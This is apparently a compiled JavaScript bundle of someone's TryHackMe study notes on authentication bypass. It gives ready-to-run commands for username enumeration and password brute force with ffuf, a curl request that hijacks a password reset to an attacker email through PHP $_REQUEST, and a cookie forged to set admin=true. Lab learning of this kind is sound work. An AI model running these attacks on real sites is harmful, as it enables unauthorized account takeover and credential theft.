"use strict";(self.webpackChunkTHM_Notes=self.webpackChunkTHM_Notes||[]).push([[1519],{3270:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>l,frontMatter:()=>r,metadata:()=>o,toc:()=>d});var s=t(4848),i=t(8453);const r={},a="Username Enumeration",o={id:"Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass",title:"Authentication Bypass",description:"Four ways website authentication methods can be bypassed, defeated or broken:",source:"@site/docs/Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass.md",sourceDirName:"Jr Penetration Tester/Introduction to Web Hacking",slug:"/Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/Authentication Bypass",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"THMSidebar",previous:{title:"Principles of Security",permalink:"/docs/Jr Penetration Tester/Introduction to Pentesting/Principles of Security"},next:{title:"Command Injection",permalink:"/docs/Jr Penetration Tester/Introduction to Web Hacking/Command Injection"}},c={},d=[{value:"Plain Text",id:"plain-text",level:2},{value:"Hashing",id:"hashing",level:2},{value:"Encoding",id:"encoding",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.p,{children:"#Web"}),"\n",(0,s.jsx)(n.p,{children:"Four ways website authentication methods can be bypassed, defeated or broken:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Username Enumeration"}),"\n",(0,s.jsx)(n.li,{children:"Brute Force"}),"\n",(0,s.jsx)(n.li,{children:"Logic Flaw"}),"\n",(0,s.jsx)(n.li,{children:"Cookie Tampering"}),"\n"]}),"\n",(0,s.jsx)(n.h1,{id:"username-enumeration",children:"Username Enumeration"}),"\n",(0,s.jsx)(n.p,{children:"Using website error to collect a list of valid usernames"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"\n'})}),"\n",(0,s.jsx)(n.p,{children:"The -w argument is to specify the wordlist, the -X argument specifies the request method (default is GET), the -d argument specifies the data that will be sent, the -H argument is to adding addition headers, by setting Content-Type, which let server know we are sending data, the -u argument specifies the URL, the -mr argument is the text we are looking for to validate we've found a valid username."}),"\n",(0,s.jsx)(n.h1,{id:"brute-force",children:"Brute Force"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.23.148/customers/login -fc 200\n'})}),"\n",(0,s.jsx)(n.p,{children:"When using multiple wordlists, we can specify our own FUZZ keyword by using -w argument separated with a comma. And using -fc argument to check for an HTTP status code other than 200 for a positive match."}),"\n",(0,s.jsx)(n.h1,{id:"logic-flaw",children:"Logic Flaw"}),"\n",(0,s.jsx)(n.p,{children:"The mock code below check the path the client is visiting begins with /admin."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"if( url.substr(0,6) === '/admin') {\n    # Code to check user is an admin\n} else {\n    # View Page\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The code above using ",(0,s.jsx)(n.code,{children:"==="}),", which looking for an exact match on the string, an user requesting\xa0",(0,s.jsx)(n.strong,{children:"/adMin"}),"\xa0will not have privileges checked and have the page displayed to them, totally bypassing the authentication checks."]}),"\n",(0,s.jsx)(n.p,{children:"At this stage, we know both the email and username and then the password link is sent to the email address of the account owner."}),"\n",(0,s.jsx)(n.p,{children:"In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field."}),"\n",(0,s.jsxs)(n.p,{children:["In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable ",(0,s.jsx)(n.code,{children:"$_REQUEST"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["The PHP ",(0,s.jsx)(n.code,{children:"$_REQUEST"})," variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"user@tryhackme$ curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'\n"})}),"\n",(0,s.jsx)(n.h1,{id:"cookie-tampering",children:"Cookie Tampering"}),"\n",(0,s.jsx)(n.h2,{id:"plain-text",children:"Plain Text"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Set-Cookie: logged_in=true; Max-Age=3600; Path=/ \nSet-Cookie: admin=false; Max-Age=3600; Path=/\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Change the cookie to ",(0,s.jsx)(n.strong,{children:"Logged In As An Admin"})," by using below command"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test\n'})}),"\n",(0,s.jsx)(n.h2,{id:"hashing",children:"Hashing"}),"\n",(0,s.jsx)(n.p,{children:"Some cookie values are a long string of random characters, these are called hashes which are an irreversible representation of the origin text."}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"md5"}),"\n",(0,s.jsx)(n.li,{children:"sha-256"}),"\n",(0,s.jsx)(n.li,{children:"sha-512"}),"\n",(0,s.jsxs)(n.li,{children:["sha1\nWe can use ",(0,s.jsx)(n.a,{href:"https://crackstation.net/",children:"crackstation"}),"to find original strings."]}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"encoding",children:"Encoding"}),"\n",(0,s.jsx)(n.p,{children:"It is a random string of text which is reversible.\nCommon encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding."})]})}function l(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>o});var s=t(6540);const i={},r=s.createContext(i);function a(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);